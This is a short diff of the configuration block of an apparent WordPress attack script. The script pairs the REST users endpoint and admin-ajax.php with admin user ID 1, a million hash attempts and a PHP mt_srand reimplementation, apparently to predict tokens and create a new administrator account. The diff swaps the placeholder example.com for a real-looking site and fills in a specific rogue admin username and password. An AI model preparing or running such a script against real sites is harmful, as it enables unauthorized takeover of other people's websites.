@@ -4,14 +4,14 @@ import string
 import concurrent.futures
 
 # Configuration
-target_url = 'http://example.com'
+target_url = 'https://oceanofcompressed.com'
 rest_api_endpoint = '/wp-json/wp/v2/users'
 ajax_endpoint = '/wp-admin/admin-ajax.php'
 admin_user_id = '1'
 num_hash_attempts = 1000000
 num_workers = 10
-new_username = 'newadminuser'  # Replace with desired username
-new_user_password = 'NewAdminPassword123!'  # Replace with a secure password
+new_username = 'ayushpvppro'  # Replace with desired username
+new_user_password = '@Helloitsme123'  # Replace with a secure password
 
 def mt_srand(seed=None):
     """
